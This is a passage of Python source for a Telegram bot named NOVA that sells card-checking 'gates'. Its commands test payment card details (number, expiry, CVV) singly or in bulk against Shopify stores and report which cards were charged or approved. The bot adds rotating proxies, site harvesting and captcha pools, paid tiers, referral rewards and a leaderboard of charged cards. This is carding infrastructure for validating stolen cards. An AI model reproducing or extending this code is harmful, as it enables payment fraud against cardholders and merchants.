                buttons=buttons, supports_streaming=True)
            return
        except Exception:
            pass
    welcome = get_welcome_video()
    if welcome:
        try:
            sent = await client_instance.send_file(
                event.chat_id, welcome,
                caption=text_clean, formatting_entities=wents,
                buttons=buttons, supports_streaming=True)
            if sent and sent.video:
                set_welcome_file_id(sent.video.id)
            return
        except Exception:
            pass
    await styled_reply(event, text, buttons=buttons)


@client.on(events.CallbackQuery(data=b"main_menu"))
async def cb_main(event):
    await event.answer()
    uid = event.sender_id
    try:
        sender = await event.get_sender()
        username = sender.username or f"user_{uid}"
    except Exception:
        username = f"user_{uid}"
    if uid in ADMIN_ID:
        status = f"👑 {bs('Admin')}"
    elif is_premium(uid):
        status = f"⭐ {bs('Premium')}"
    else:
        status = f"🆓 {bs('Free')}"
    text = pe(f"""💎 <b>{bs('NOVA')}</b>
{SEP}
👤 @{username}
🆔 <code>{uid}</code>
📊 {status}
{SEP}
🔥 {bs('Fast · Accurate · Reliable')}
💡 {bs('Use the buttons below')}
{SEP}
{DEV_LINE}""")
    try:
        await event.edit(text, buttons=main_menu_buttons(uid),
                         parse_mode='html', link_preview=False)
    except Exception:
        pass


@client.on(events.CallbackQuery(data=b"close_menu"))
async def cb_close(event):
    await event.answer()
    try:
        await event.delete()
    except Exception:
        pass


@client.on(events.CallbackQuery(data=b"check_joined"))
async def cb_check_joined(event):
    uid = event.sender_id
    _JOIN_CACHE.pop(uid, None)
    if await is_user_joined(uid):
        await event.answer("✅ Verified!", alert=True)
        try:
            await event.delete()
        except Exception:
            pass
        try:
            sender = await event.get_sender()
            username = sender.username or "User"
        except Exception:
            username = "User"
        status_text = f"👑 {bs('Admin')}" if uid in ADMIN_ID else (
            f"💎 {bs('Premium')}" if is_premium(uid) else f"🆓 {bs('Free')}")
        welcome = pe(f"""{SEP}
    ✨ {bs('Welcome to NOVA')} ✨
{SEP}
👤 {bs('User')}: @{username}
🆔 {bs('ID')}: <code>{uid}</code>
📊 {bs('Status')}: {status_text}
{SEP}
🔥 {bs('Fast・Accurate・Zero Errors')} 🔥
{SEP}""")
        try:
            await client_instance.send_message(
                event.chat_id, *build_entities(welcome),
                buttons=main_menu_buttons(uid), link_preview=False)
        except Exception:
            pass
    else:
        await event.answer("❌ Not joined yet", alert=True)


@client.on(events.CallbackQuery(data=b"gates_menu"))
async def cb_gates(event):
    await event.answer()
    text = pe(f"""🔓 <b>{bs('Gates')}</b>
{SEP}
🛒 <b>{bs('Shopify')}</b>
└─ <code>• /sh</code> · <code>• /msh</code>
{SEP}
🔑 <b>{bs('Key')}</b>
└─ <code>• /redeem</code>
{SEP}
📊 <b>{bs('Info')}</b>
└─ <code>• /me</code> · <code>• /rank</code> · <code>• /streak</code> · <code>• /history</code>""")
    kb = [
        [pbtn("• /sh", data="sub_sh_help", style="success", icon="🛒"),
         pbtn("• /msh", data="sub_mass", style="primary", icon="📦")],
        [pbtn(bs("🔙 Back"), data="main_menu", style="danger", icon="🔙")],
    ]
    try:
        await event.edit(text, buttons=kb, parse_mode='html', link_preview=False)
    except Exception:
        pass


@client.on(events.CallbackQuery(data=b"sub_sh_help"))
async def cb_sub_sh_help(event):
    await event.answer()
    text = pe(f"""🛒 <b>{bs('/sh — Single Card Check')}</b>
{SEP}
<b>{bs('Syntax')}</b>
└─ <code>• /sh number|mm|yyyy|cvv</code>
{SEP}
<b>{bs('Returns')}</b>
┣ 🥇 {bs('Charged')}
┣ 🥈 {bs('Approved')}
┣ 🥉 {bs('3DS')}
┣ 🥔 {bs('Declined')}
┗ 🧨 {bs('Error')}""")
    kb = [[pbtn(bs("🔙 Back"), data="gates_menu", style="danger", icon="🔙")]]
    try:
        await event.edit(text, buttons=kb, parse_mode='html', link_preview=False)
    except Exception:
        pass


@client.on(events.CallbackQuery(data=b"sub_mass"))
async def cb_sub_mass(event):
    await event.answer()
    text = pe(f"""📦 <b>{bs('/msh — Mass Shopify Check')}</b>
{SEP}
<b>{bs('Syntax')}</b>
└─ <code>• /msh</code> <i>(reply to .txt)</i>
{SEP}
<b>{bs('Output')}</b>
└─ 5 .txt files""")
    kb = [[pbtn(bs("🔙 Back"), data="gates_menu", style="danger", icon="🔙")]]
    try:
        await event.edit(text, buttons=kb, parse_mode='html', link_preview=False)
    except Exception:
        pass


@client.on(events.CallbackQuery(data=b"proxy_menu"))
async def cb_proxy_menu(event):
    await event.answer()
    uid = event.sender_id
    is_prem = (uid in ADMIN_ID or is_premium(uid))
    count = len(load_user_proxies(uid))
    if not is_prem:
        text = pe(f"""🔌 <b>{bs('Proxy Manager')}</b>
{SEP}
💎 <b>{bs('Premium only')}</b>""")
        kb = [[pbtn(bs("🔙 Back"), data="main_menu", style="danger", icon="🔙")]]
        try:
            await event.edit(text, buttons=kb, parse_mode='html', link_preview=False)
        except Exception:
            pass
        return
    text = pe(f"""🔌 <b>{bs('Proxy Manager')}</b>
{SEP}
📁 {bs('Saved')}: <code>{count}/{MAX_PROXIES_PER_USER}</code>
✅ {bs('Strict check enforced')}
{SEP}
📥 <code>• /addproxy</code>
🔀 <code>• /proxy</code>  (re-check all)
📂 <code>• /myproxy</code>
📤 <code>• /getproxy</code>
{SEP}
❌ <code>• /rmproxy ip:port:u:p</code>
🔢 <code>• /rmproxyindex 1,2,3</code>
🗑 <code>• /clearproxy</code>""")
    kb = [[pbtn(bs("🔙 Back"), data="main_menu", style="danger", icon="🔙")]]
    try:
        await event.edit(text, buttons=kb, parse_mode='html', link_preview=False)
    except Exception:
        pass


@client.on(events.CallbackQuery(data=b"rank_menu"))
async def cb_rank_menu(event):
    await event.answer()
    top = _db.rank_all()[:10]
    if not top:
        text = pe(f"""🏆 <b>{bs('Top 10 Charged')}</b>
{SEP}
<i>{bs('No charges yet')}</i>""")
    else:
        medals = ["🥇", "🥈", "🥉"]
        lines = []
        for i, (uid_int, cnt) in enumerate(top):
            try:
                ent = await client_instance.get_entity(int(uid_int))
                name = ent.first_name or str(uid_int)
            except Exception:
                name = str(uid_int)
            medal = medals[i] if i < 3 else f"<b>{i+1}.</b>"
            lines.append(f"{medal} <b>{name}</b> — <code>{cnt}</code>")
        text = pe(f"🏆 <b>{bs('Top 10 Charged')}</b>\n{SEP}\n" + "\n".join(lines))
    kb = [[pbtn(bs("🔙 Back"), data="main_menu", style="danger", icon="🔙")]]
    try:
        await event.edit(text, buttons=kb, parse_mode='html', link_preview=False)
    except Exception:
        pass


@client.on(events.CallbackQuery(data=b"streak_menu"))
async def cb_streak_menu(event):
    await event.answer()
    uid = event.sender_id
    s = get_streak(uid)
    cur, best = s["current"], s["best"]
    upcoming = [d for d in sorted(STREAK_MILESTONES.keys()) if d > cur]
    if upcoming:
        target = upcoming[0]
        prev = max([d for d in STREAK_MILESTONES if d <= cur] + [0])
        span = target - prev
        step = cur - prev
        bar = "▰" * max(0, step) + "▱" * max(0, span - step)
        next_str = f"{bs('Next')} <code>{target}d</code> · <code>{span-step}</code> {bs('left')}"
    else:
        bar = "▰" * 10
        next_str = f"<i>{bs('Max reached')}</i>"
    text = pe(f"""🔥 <b>{bs('Daily Streak')}</b>
{SEP}
📅 {bs('Current')}: <code>{cur}</code>
🏆 {bs('Best')}: <code>{best}</code>
✅ {bs('Total')}: <code>{s['total_checks']}</code>

{bar}
{next_str}""")
    kb = [[pbtn(bs("🔙 Menu"), data="main_menu", style="danger", icon="🔙")]]
    try:
        await event.edit(text, buttons=kb, parse_mode='html', link_preview=False)
    except Exception:
        pass


@client.on(events.CallbackQuery(data=b"me_menu"))
async def cb_me_menu(event):
    await event.answer()
    uid = event.sender_id
    try:
        sender = await event.get_sender()
        username = sender.username or f"user_{uid}"
        name = sender.first_name or username
    except Exception:
        username, name = f"user_{uid}", "User"
    charged_total = _db.get_charged_count(uid)
    s = get_streak(uid)
    if uid in ADMIN_ID:
        tier = f"👑 {bs('Admin')}"; cc_limit = 100000
    elif is_premium(uid):
        tier = f"💎 {bs('Premium')}"
        cc_limit = _db.get_cc_limit(uid)
    else:
        tier = f"🆓 {bs('Free')}"; cc_limit = 0
    text = pe(f"""📊 <b>{bs('My Stats')}</b>
{SEP}
👤 <b>{name}</b> (@{username})
🆔 <code>{uid}</code>
🎖️ {bs('Tier')}: {tier}
💳 {bs('CC Limit')}: <code>{cc_limit}</code>
{SEP}
🔥 {bs('Streak')}: <code>{s['current']}</code>
💳 {bs('Charged')}: <code>{charged_total}</code>""")
    kb = [[pbtn(bs("🔙 Menu"), data="main_menu", style="danger", icon="🔙")]]
    try:
        await event.edit(text, buttons=kb, parse_mode='html', link_preview=False)
    except Exception:
        pass


@client.on(events.CallbackQuery(data=b"ref_menu"))
async def cb_ref_menu(event):
    await event.answer()
    uid = event.sender_id
    s = referral_stats(uid)
    code = s["code"]
    try:
        me = await client_instance.get_me()
        bot_user = me.username or "YourBot"
    except Exception:
        bot_user = "YourBot"
    link = f"https://t.me/{bot_user}?start=ref_{code}"
    every = REFERRAL_MILESTONE_EVERY
    confirmed = s["confirmed"]
    in_cycle = confirmed % every
    bar = "▰" * in_cycle + "▱" * (every - in_cycle)
    text = pe(f"""🎁 <b>{bs('Referral Program')}</b>
{SEP}
🔗 <code>{link}</code>
🔑 <code>{code}</code>
{SEP}
📊 {bs('Confirmed')}: <code>{confirmed}</code> · ⏳ {bs('Pending')}: <code>{s['pending']}</code>

📈 <code>{bar}</code> {in_cycle}/{every}
🎯 {bs('Next in')}: <code>{s['next_milestone_in']}</code> {bs('more')}

💎 <b>{bs('Reward')}</b>: <code>+{REFERRAL_MILESTONE_HOURS}h +{REFERRAL_MILESTONE_CC_LIMIT} CC</code> {bs('every')} <code>{every}</code> {bs('refs')}""")
    share_url = f"https://t.me/share/url?url={link}&text=Join%20NOVA!"
    kb = [
        [pbtn(bs("📤 Share"), url=share_url, style="success", icon="📤")],
        [pbtn(bs("🏆 Leaderboard"), data="ref_leaderboard", style="primary", icon="🏆")],
        [pbtn(bs("🔙 Back"), data="main_menu", style="danger", icon="🔙")],
    ]
    try:
        await event.edit(text, buttons=kb, parse_mode='html', link_preview=False)
    except Exception:
        pass


@client.on(events.CallbackQuery(data=b"ref_leaderboard"))
async def cb_ref_leaderboard(event):
    await event.answer()
    data = load_referrals()
    rows = []
    for uid_s, u in data["users"].items():
        cnt = len(u.get("rewarded", []))
        if cnt > 0:
            rows.append((uid_s, cnt, int(u.get("total_hours_earned", 0))))
    rows.sort(key=lambda x: x[1], reverse=True)
    rows = rows[:10]
    if not rows:
        text = pe(f"🏆 <b>{bs('Leaderboard')}</b>\n{SEP}\n<i>{bs('Empty')}</i>")
    else:
        medals = ["🥇", "🥈", "🥉"]
        lines = []
        for i, (uid_s, cnt, hrs) in enumerate(rows):
            try:
                ent = await client_instance.get_entity(int(uid_s))
                name = ent.first_name or uid_s
            except Exception:
                name = uid_s
            medal = medals[i] if i < 3 else f"<b>{i+1}.</b>"
            lines.append(f"{medal} <b>{name}</b> — <code>{cnt}</code> · <code>{hrs}h</code>")
        text = pe(f"🏆 <b>{bs('Leaderboard')}</b>\n{SEP}\n" + "\n".join(lines))
    kb = [[pbtn(bs("🔙 Back"), data="ref_menu", style="danger", icon="🔙")]]
    try:
        await event.edit(text, buttons=kb, parse_mode='html', link_preview=False)
    except Exception:
        pass


@client.on(events.CallbackQuery(data=b"plans_pricing"))
async def cb_plans(event):
    await event.answer()
    text = pe(f"""💎 <b>{bs('Plans & Pricing')}</b>

{SEP}
💎 <b>{bs('Access')}</b> — 7 {bs('Days')} — <code>$10</code>
💎 <b>{bs('Elite')}</b> — 15 {bs('Days')} — <code>$15</code>
💎 <b>{bs('Pro')}</b> — 30 {bs('Days')} — <code>$30</code>
{SEP}
🎁 {bs('Or refer')} <code>5</code> {bs('friends → 1 day free')}
{SEP}
💡 {bs('Contact')} <a href='https://t.me/{OWNER_TAG.lstrip("@")}'>{OWNER_TAG}</a>""")
    kb = [
        [pbtn(bs("📩 Contact"), url=f"https://t.me/{OWNER_TAG.lstrip('@')}",
              style="success", icon="📩")],
        [pbtn(bs("🔙 Back"), data="main_menu", style="danger", icon="🔙")],
    ]
    try:
        await event.edit(text, buttons=kb, parse_mode='html', link_preview=False)
    except Exception:
        pass


@client.on(events.CallbackQuery(data=b"admin_panel"))
async def cb_admin_panel(event):
    if event.sender_id not in ADMIN_ID:
        return await event.answer("Access denied", alert=True)
    await event.answer()
    db_stats = _db.stats()
    text = pe(f"""👑 <b>{bs('Admin Panel')}</b>
{SEP}
📋 <b>{bs('Premium')}</b>
┣ <code>/addpremium user_id [days] [cc]</code>
┣ <code>/removepremium user_id</code>
┗ <code>/listpremium</code>
{SEP}
🔑 <b>{bs('Keys')}</b>
┣ <code>/genkeys n h max cc [price]</code>
┣ <code>/listkeys</code>
┗ <code>/delkey NOVA_XXXX</code>
{SEP}
🎁 <b>{bs('Referrals')}</b>
┣ <code>/refstats</code> · <code>/refgive user_id</code>
┗ <code>/refreset user_id</code>
{SEP}
👑 <b>{bs('Admin')}</b>
┣ <code>/addadmin user_id</code>
┗ <code>/removeadmin user_id</code>
{SEP}
🌐 <b>{bs('Sites')}</b>
┣ <code>/addsites</code> · <code>/resetsites</code> · <code>/site</code>
┣ <code>/shscan</code> · <code>/shharvest</code>
┗ <code>/setthreshold 7</code> · <code>/setminprice 0.01</code>
{SEP}
🎬 <b>{bs('Videos')}</b>
┣ <code>/setwelcomevideo</code> (reply to video)
┣ <code>/addhitvideo</code> (reply to video)
┣ <code>/listhitvideos</code> · <code>/hitvideo</code>
┗ <code>/removehitvideo N</code>
{SEP}
📊 <b>{bs('Bot')}</b>
┣ <code>/stats</code> · <code>/status</code> · <code>/ping</code>
┣ <code>/api</code> · <code>/version</code> · <code>/diag</code>
┣ <code>/sitestats</code> · <code>/resetstats</code>
┣ <code>/setuserlimit user_id N</code>
┣ <code>/toggle</code>
┗ <code>/all message</code>
{SEP}
💾 <b>{bs('Mongo')}</b>
┣ {bs('Users')}: <code>{db_stats.get('users_total', 0)}</code>
┣ {bs('Premium')}: <code>{db_stats.get('users_premium', 0)}</code>
┗ {bs('Checks')}: <code>{db_stats.get('checks_total', 0)}</code>""")
    buttons = [[pbtn(bs("🔙 Back"), data="main_menu", style="danger", icon="🔙")]]
    try:
        await event.edit(text, buttons=buttons, parse_mode='html', link_preview=False)
    except Exception:
        pass


# =============================================================================
# BACKGROUND LOOPS
# =============================================================================
async def premium_cleanup_loop():
    while True:
        await asyncio.sleep(3600)
        try:
            n = _db.purge_expired()
            if n > 0:
                log_system("MONGO", f"purged {n} expired premium rows")
        except Exception:
            pass


async def stats_loop():
    interval = 7200 if os.getenv("RAILWAY_ENVIRONMENT") else 21600
    while True:
        await asyncio.sleep(interval)
        try:
            snap = _site_fetcher.snapshot()
            ds = _db.stats()
            log_system("STATS",
                       f"users={ds.get('users_total', 0)} "
                       f"premium={ds.get('users_premium', 0)} "
                       f"checks={ds.get('checks_total', 0)} "
                       f"pool={snap.get('count', 0)} "
                       f"captcha={snap.get('captcha_count', 0)}")
        except Exception:
            pass


# =============================================================================
# MAIN
# =============================================================================
async def main():
    global client_instance
    client_instance = client

    try:
        os.makedirs(VIDEO_DIR, exist_ok=True)
    except Exception:
        pass

    _load_admins()

    if _db.boot():
        log_system("BOOT", "Mongo connected")
    else:
        log_system("BOOT", "Mongo NOT connected — falling back to no-op", "warning")

    log_system("BOOT", "Starting NOVA bot v9.4.0 (mongo)...")
    log_system("BOOT", f"admins loaded: {ADMIN_ID}")
    log_system("BOOT", f"shopify engine: {'OK' if _SHOPIFY_ENGINE_OK else 'STUB'}")
    log_system("BOOT", f"site fetcher:  {'OK' if _SITE_FETCHER_OK else 'STUB'}")
    log_system("BOOT", f"database:      {'OK' if _DB_OK else 'STUB'}")

    if not BOT_TOKEN:
        log_system("BOOT", "BOT_TOKEN env var not set — aborting", "error")
        return

    for path in (SITES_FILE, RZ_SITES_FILE):
        if not os.path.exists(path):
            open(path, 'a').close()

    try:
        _site_fetcher.start_harvester()
        log_system("BOOT",
                   f"harvester — pool={_site_fetcher.pool_size()} "
                   f"captcha={_site_fetcher.captcha_size()}")
    except Exception as e:
        log_system("BOOT", f"harvester start failed: {e}", "warning")

    threading.Thread(target=_health_server, daemon=True, name="health").start()
    log_system("BOOT", f"health server bound to :{os.getenv('PORT', '10000')}")

    asyncio.create_task(premium_cleanup_loop())
    asyncio.create_task(stats_loop())

    while True:
        try:
            log_system("BOOT", "Connecting...")
            await client.start(bot_token=BOT_TOKEN)
            log_system("BOOT", "✅ NOVA bot online.")
            me = await client.get_me()
            log_system("BOOT", f"  bot=@{me.username}  id={me.id}")
            await client.run_until_disconnected()
        except FloodWaitError as e:
            log_system("FLOOD", f"Sleeping {e.seconds + 5}s", "warning")
            await asyncio.sleep(e.seconds + 5)
        except Exception as e:
            log_system("CRASH", f"{type(e).__name__}: {e}", "error")
            await asyncio.sleep(10)


if __name__ == "__main__":
    asyncio.run(main())
